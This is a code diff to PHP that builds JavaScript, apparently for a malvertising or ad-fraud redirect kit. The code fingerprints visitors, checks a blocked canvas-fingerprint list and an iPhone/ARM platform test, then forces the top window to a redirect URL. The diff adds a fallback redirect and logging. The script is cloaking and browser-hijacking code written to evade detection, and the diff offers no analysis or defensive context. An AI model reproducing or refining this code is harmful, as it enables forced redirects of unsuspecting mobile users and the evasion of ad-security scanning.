@@ -497,7 +497,20 @@
 		}
 		else if ($redirectMethod === "windowtoplocation")
 		{
-			$redirectCode = "window.top.location = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);";
+			$redirectCode = "try
+							 {
+								 window.top.location = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);
+							 }
+							 catch(e)
+							 {
+							 	try
+							 	{
+							 		window.location = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);
+							 	}
+							 	catch(e)
+							 	{
+							 	}
+							 }";
 		}
 		else if ($redirectMethod === "1x1iframe")
 		{
@@ -570,14 +583,21 @@
 							($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ? "testResults.push(!inBlockedCanvasList());\n" : "") .							
 						   "jslog(testResults);
 
-						   	if (/(iphone|linux armv)/i.test(window.navigator.platform) && testResults.every(isTrue))
-						    {
-							    setTimeout(function()
-								{
-									var topDomain = getReferrerDomain();
+						   	if (testResults.every(isTrue))
+						   	{
+							   	if (/(iphone|linux armv)/i.test(window.navigator.platform))
+							    {
+								    setTimeout(function()
+									{
+										var topDomain = getReferrerDomain();
 
-									$redirectCode
-								}, $redirectTimeout);
+										$redirectCode
+									}, $redirectTimeout);
+								}
+								else
+								{
+									jslog('Platform test failed: ' + window.navigator.platform);
+								}
 							}
 					   	}
 
